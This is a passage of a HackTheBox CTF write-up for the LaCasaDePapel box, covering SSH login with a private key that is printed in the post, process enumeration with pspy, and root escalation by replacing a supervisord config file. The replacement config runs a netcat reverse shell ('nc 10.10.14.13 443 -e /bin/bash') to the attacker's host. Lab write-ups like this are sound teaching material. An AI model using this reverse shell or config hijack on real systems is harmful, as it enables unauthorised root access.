+<span class="go">oHwi+FB94Yx1xaPFGP7T0jnBU3molURhKKolNqY78PE5qYplO/eO5H/7vKbrF7J5VtsVpv</span>
+<span class="go">GQsmjqUhQK/GoYrMudIhcfQSMUnpgWXYtCnIpBa53aY/fl0XYpL9a1ZQh1iGm4oleVnZNv</span>
+<span class="go">qMa4mb+8kC8k3WDmw9pq/W3eGVQ6Xeyj/4kUENe1Q8xj9BIXLZJwXYHtACLS4PaKZSRaFS</span>
+<span class="go">jkc/26/T2958f2oBqJLf+oxiydgcTI2vC34OYwwS7cOcSsS4HivUC6K7oJJHw3nUNoA2ge</span>
+<span class="go">3cwiO6bNHrEKMJWOrMpp9UH9BbQ/u7k5Ap7QF8yBfrdC64EAUzyZJXWde1NhSNjiI0rBqz</span>
+<span class="go">CPZQGSOLEIFAwzU0bMIuJu4JIQOAH+3tfoh8ccUdNcmfH7LaT7pF3VYwyoPMowLpA8fG4F</span>
+<span class="go">XGyvoyrfeTXC6GY0+1NVUAAAADAQABAAACAAx3e25qai7yF5oeqZLY08NygsS0epNzL40u</span>
+<span class="go">fh9YfSbwJiO6YTVQ2xQ2M1yCuLMgz/Qa/tugFfNKaw9qk7rWvPiMMx0Q9O5N5+c3cyV7uD</span>
+<span class="go">Ul+A/TLRsT7jbO5h+V8Gf7hlBIt9VWLrPRRgCIKxJpDb7wyyy5S90zQ6apBfnpiH0muQMN</span>
+<span class="go">IAcbQVOK/pHYqnakLaATtV8G3OLcmFzqe/3wZFbWYT0Tr4q1sBMYSXkiixW4gch4FDyNq+</span>
+<span class="go">5oaQ0zKj6Jibc4n4aQudtHnJxOi49Z+Bd5v5mnlWXw3mNN4klGJWklXdif6kgbnuyHeh42</span>
+<span class="go">xlsBtcwYKWNRF1/bAQiSoZn4iNJqSFYcx9SzE+QadUfhtkbBiBC7HPHhANgmcg4FBJsz3f</span>
+<span class="go">S4vJWkQvRd/wGjW+B6ywn6qrsJ1hSaoR9Tr7pwKfTKL1HyvMCWd5DEt98EWyyQUdHfKYgp</span>
+<span class="go">E4oo6g2LX9c6bLawGvzFkVcfiH8XM0lyRpKV2hAU03KzNbbmy73HsxMBbVp0SMk62phRWw</span>
+<span class="go">t8dQedPW8J71LR0igh8ckkuP13ZWPUUdTJJDc4UZycDzNruCj/8kPYn4Lo4s8E1XJ3y/F8</span>
+<span class="go">GQn2NvjjhkOgS+fMnQwfxPl3yDg4g/QgxOQ5b3yZwPVUM75IjperwQYXjzfY1XO5WtyGc7</span>
+<span class="go">5iUJMuSvXWukWAKJtBAAABAA+0Nxztrd02xlT+o9FRgUJ2CCed11eqAX2Lo2tpJB8G7e88</span>
+<span class="go">9OCz3YqRDAQSm4/1okhKPUj3B/bcZqOyRFbABZTJYOg0/m0Ag6Fb26S3TBMMrAgrSnxksZ</span>
+<span class="go">36KlW1WpuwrKq+4jSFJV5cPjpk9jVQmhvdgxHlSjIEpOkByOH4aKK7wuaIA5jqPKrq74cD</span>
+<span class="go">mukNhpV4xjan1Rj7zPFLnoce0QMWdX4CShUa+BNInls8/v7MflLgxQ53I21cHXTdNf5zrc</span>
+<span class="go">48jlAJQuRiTSgIYSu+G1IIoLibVA/GPWOOJ2jmV0cpNzfbmGM/A2AEGvSKtuP9DwA1NHfn</span>
+<span class="go">DDUIZds61tF9CxUAAAEBANVkFLByFDv9qnHymc/tr6dtqyyMY6D7YeU3ZWL+dNPSlSW/bN</span>
+<span class="go">YjlA9S4aB2yuN+tAMeU0E6jKgh1+ROlNwXu48uN/QL50gZpiLcSlqZnhFQ/2El2Uvj2Y/S</span>
+<span class="go">PnklDVQnQ/5yZBQR0bBiy/EJIOfJQo0KRbR/pq51eUhzBSEBMz6nBIY8zPdOVfhngZUpMe</span>
+<span class="go">4S7N1RPDWS2OvGwwWkwmmiJe45cGD7SKLj0Jv+p/DZ+k9ZiI5tEGY87DKAh0wrV04u4I/l</span>
+<span class="go">xGl6TCoXDr7hi1dAdVWW84cj8mFW7q9UN0y15Vn82HPIq5ZaSKfM6qPKfYeBBaN8hUIogf</span>
+<span class="go">+FlwHjzSWOPb0AAAEBAMNU3uGeUUMVn1dUOMeemr+LJVHHjtqbL3oq97+fd1ZQ6vchTyKX</span>
+<span class="go">6cbCC7gB13qJ6oWO1GhB9e4SAd3DYiNv/LO9z1886DyqNLVHKYXn0SNSLTPb7n9NjwJNz1</span>
+<span class="go">GuPqW43pGwlBhMPZhJPA+4wmiO9GV+GXlaFrz16Or/qCexGyovMIhKtV0Ks3XzHhhjG41e</span>
+<span class="go">gKd/wGl3vV74pTWIyS2Nrtilb7ii8jd2MezuSTf7SmjiE0GPY8xt0ZqVq+/Fj/vfM+vbN1</span>
+<span class="go">ram9k+oABmLisVVgkKvfbzWRmGMDfG2X0jOrIw52TZn9MwTcr+oMyi1RTG7oabPl6cNM0x</span>
+<span class="go">X3a0iF5JE3kAAAAYYmVybGluQGxhY2FzYWRlcGFwZWwuaHRiAQID</span>
+<span class="go">-----END OPENSSH PRIVATE KEY-----</span>
+</pre></div>
+
+
+<p>I save this key on my kali box and I try to SSH to the box with the user <code>berlin</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$</span> ssh -i private.key berlin@10.10.10.131
+<span class="go">The authenticity of host &#39;10.10.10.131 (10.10.10.131)&#39; can&#39;t be established.</span>
+<span class="go">ECDSA key fingerprint is SHA256:rA99W+GVzo0hlABp1vMj9ChhjLwybPhHTpb65AWm7xI.</span>
+<span class="go">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
+<span class="go">Warning: Permanently added &#39;10.10.10.131&#39; (ECDSA) to the list of known hosts.</span>
+<span class="go">berlin@10.10.10.131&#39;s password: </span>
+<span class="go">Permission denied, please try again.</span>
+</pre></div>
+
+
+<p>After being stuck here for a while, the solution was to try another user. I know, in normal situations it's unlikely to find a user's SSH private key under some other user's directory but this is CTF and these kind of things happen. As shown below I was finally able to login with the user <code>professor</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/lacasadepapel$</span> ssh -i private.key professor@10.10.10.131
+
+<span class="go"> _             ____                  ____         ____                  _ </span>
+<span class="go">| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |</span>
+<span class="go">| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | &#39;_ \ / _ \ |</span>
+<span class="go">| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |</span>
+<span class="go">|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|</span>
+<span class="go">                                                            |_|       </span>
+
+<span class="go">lacasadepapel [~]$whoami</span>
+<span class="go">professor</span>
+</pre></div>
+
+
+<p>Once in, we can see two files in <code>professor</code> home directory:</p>
+<div class="highlight"><pre><span></span><span class="go">lacasadepapel [~]$ ls -l</span>
+<span class="go">total 12</span>
+<span class="go">-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini</span>
+<span class="go">-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js</span>
+<span class="go">drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules </span>
+<span class="go">lacasadepapel [~]$ cat memcached.ini </span>
+<span class="go">[program:memcached]</span>
+<span class="go">command = sudo -u nobody /usr/bin/node /home/professor/memcached.js</span>
+</pre></div>
+
+
+<p>We are only able to read <code>memcached.ini</code> which seems to just load <code>memcached.js</code> as nobody.</p>
+<p>I have then started a python SimpleHTTPServer in my kali box and hosted <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> and <a href="https://github.com/DominicBreuker/pspy">pspy</a>. I have then used <code>wget</code> to donwload both files into the <code>/tmp</code> directory of the victim box. While I didn't see anything suspicious with <code>LinEnum</code> I saw something with <code>pspy</code>:</p>
+<div class="highlight"><pre><span></span><span class="go">&lt;SNIP&gt;                                         </span>
+<span class="go">2020/06/22 09:39:00 CMD: UID=0    PID=8599   | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start                                                                      </span>
+<span class="go">2020/06/22 09:39:02 CMD: UID=0    PID=8624   | sudo -u nobody /usr/bin/node /home/professor/memcached.js</span>
+<span class="go">&lt;SNIP&gt;</span>
+
+<span class="go">&lt;SNIP&gt;</span>
+<span class="go">2020/06/22 09:42:01 CMD: UID=0    PID=8800   | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start </span>
+<span class="go">2020/06/22 09:42:02 CMD: UID=0    PID=8806   | sudo -u nobody /usr/bin/node /home/professor/memcached.js </span>
+<span class="go">&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>So it looks like the <code>memcached.js</code> file runs as <code>nobody</code> every 2 minutes straight after the daemon <code>supervisord</code> runs. The command is exactly the same as what we saw inside <code>memcached.ini</code>. After a while I noticed that it didn't happen every 2 minutes. Sometimes I waited for the same thing to happen again but I didn't see it in the <code>pspy</code> output which was weird. However, if I started to <code>watch</code> the process with <code>ps</code> I notice that the PID changes every ~1 minute:</p>
+<div class="highlight"><pre><span></span><span class="go">lacasadepapel [/tmp]$ watch -n 10 &quot;ps auxww | grep memcached.js&quot;|grep -iv grep</span>
+
+<span class="go"> 9557 nobody    0:19 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9557 nobody    0:29 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9557 nobody    0:39 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9557 nobody    0:49 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9652 nobody    0:00 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9652 nobody    0:10 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9652 nobody    0:21 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9652 nobody    0:30 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9652 nobody    0:40 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9652 nobody    0:50 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9731 nobody    0:01 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9731 nobody    0:11 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9731 nobody    0:21 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9731 nobody    0:31 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9731 nobody    0:41 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9731 nobody    0:51 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9810 nobody    0:03 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9810 nobody    0:13 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9810 nobody    0:23 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9810 nobody    0:34 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9810 nobody    0:44 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9810 nobody    0:54 /usr/bin/node /home/professor/memcached.js</span>
+
+<span class="go"> 9888 nobody    0:04 /usr/bin/node /home/professor/memcached.js</span>
+</pre></div>
+
+
+<p>After some research I found that <code>supervisord</code> is a process management tool which allows to schedule process restart among other things. <code>supervisord</code> starts processes as its subprocesses so perhaps this is why the weird behavior observed with <code>pspy</code>.</p>
+<p>So at this stage I was pretty sure <code>memcached.ini</code> was being pushed by <code>supervisord</code> at regular intervals. </p>
+<p>Below it's shown that if I create a file (test) inside the <code>professor</code> home that file will be owned by professor:</p>
+<div class="highlight"><pre><span></span><span class="go">lacasadepapel [~]$ ls -l</span>
+<span class="go">total 12</span>
+<span class="go">-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini</span>
+<span class="go">-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js</span>
+<span class="go">drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules</span>
+<span class="go">lacasadepapel [~]$ touch test</span>
+<span class="go">lacasadepapel [~]$ ls -l</span>
+<span class="go">total 12</span>
+<span class="go">-rw-r--r--    1 root     root            88 Jan 29  2019 memcached.ini</span>
+<span class="go">-rw-r-----    1 root     nobody         434 Jan 29  2019 memcached.js</span>
+<span class="go">drwxr-sr-x    9 root     professo      4096 Jan 29  2019 node_modules</span>
+<span class="go">-rw-r--r--    1 professo professo         0 Jun 22 10:12 test</span>
+</pre></div>
+
+
+<p>We are unable to modify the <code>memcached.ini</code> of course because it is owned by <code>root</code> but we can delete it and recreate it. We can modify the content of the file so that when it runs again it will give us a shell as <code>root</code>. So I create a new file which looks like this:</p>
+<div class="highlight"><pre><span></span><span class="go">lacasadepapel [~]$ cat memcached.ini </span>
+<span class="go">[program:memcached]</span>
+<span class="go">command = sudo /usr/bin/nc 10.10.14.13 443 -e /bin/bash</span>
+</pre></div>
+
+
+<p>after few moments I get my shell back on the netcat listener I had setup on port 443. I then upgraded to an interacting shell and got the root flag as shown below:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo rlwrap nc -lvnp <span class="m">443</span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.13] from (UNKNOWN) [10.10.10.131] 45919</span>
+<span class="go">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="go">bash-4.4# whoami</span>
+<span class="go">whoami</span>
+<span class="go">root</span>
+<span class="go">bash-4.4# cat /root/root.txt</span>
+<span class="go">cat /root/root.txt</span>
+<span class="go">58****************************11</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.LaCasaDePapel.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("LaCasaDePapel"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
